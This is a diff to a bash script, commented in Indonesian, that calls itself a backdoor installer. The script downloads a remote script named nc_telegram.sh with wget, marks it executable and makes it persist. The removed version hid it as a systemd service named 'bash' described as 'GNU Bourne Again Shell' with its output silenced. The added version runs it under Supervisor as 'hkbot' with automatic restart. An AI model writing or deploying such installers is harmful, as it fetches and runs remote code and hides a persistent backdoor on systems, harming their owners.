@@ -1,5 +1,11 @@
 #!/bin/bash
-echo "[+] Menginstal backdoor ke systemd..."
+echo "[+] Menginstal backdoor ke Supervisor..."
+
+# Pastikan Supervisor terinstal
+if ! command -v supervisorctl &> /dev/null; then
+    echo "[+] Menginstal Supervisor..."
+    sudo apt update && sudo apt install -y supervisor
+fi
 
 # Buat direktori jika belum ada
 mkdir -p /opt/hkbot/
@@ -8,29 +14,20 @@ mkdir -p /opt/hkbot/
 wget -O /opt/hkbot/bash https://github.com/Dejavu666/hkbot/raw/refs/heads/main/nc_telegram.sh
 chmod +x /opt/hkbot/bash
 
-# Buat file systemd service
-cat <<EOF > /etc/systemd/system/bash.service
-[Unit]
-Description=GNU Bourne Again Shell
-After=network.target
-
-[Service]
-ExecStart=/bin/bash -c "/opt/hokibot/bash"
-Restart=always
-User=root
-Group=root
-StandardOutput=null
-StandardError=null
-SyslogIdentifier=bash
-PrivateTmp=true
-
-[Install]
-WantedBy=multi-user.target
+# Buat konfigurasi Supervisor
+cat <<EOF > /etc/supervisor/conf.d/hkbot.conf
+[program:hkbot]
+command=/bin/bash /opt/hkbot/bash
+autostart=true
+autorestart=true
+stderr_logfile=/var/log/hkbot.err.log
+stdout_logfile=/var/log/hkbot.out.log
 EOF
 
-# Aktifkan service
-systemctl daemon-reload
-systemctl enable bash
-systemctl start bash
+# Restart Supervisor untuk memuat konfigurasi baru
+sudo supervisorctl reread
+sudo supervisorctl update
+sudo supervisorctl start hkbot
 
-echo "[+] Instalasi selesai. Service berjalan dengan nama 'bash'."
+echo "[+] Instalasi selesai. Bot berjalan dengan Supervisor sebagai 'hkbot'."
+echo "[+] Gunakan 'sudo supervisorctl status hkbot' untuk melihat status bot."
